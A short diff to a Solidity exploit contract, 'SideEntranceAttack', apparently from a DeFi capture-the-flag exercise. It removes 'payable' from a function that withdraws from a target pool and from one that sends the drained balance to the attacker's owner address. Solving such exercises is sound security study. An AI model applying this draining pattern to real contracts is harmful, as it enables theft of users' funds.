@@ -30,11 +30,11 @@ contract SideEntranceAttack {
         pool.deposit{value:msg.value}();
     }
 
-    function withdrawFromPool() external payable {
+    function withdrawFromPool() external {
         pool.withdraw();
     }
 
-    function collectFunds() external payable {
+    function collectFunds() external {
         payable(owner).sendValue(address(this).balance);
     }
 
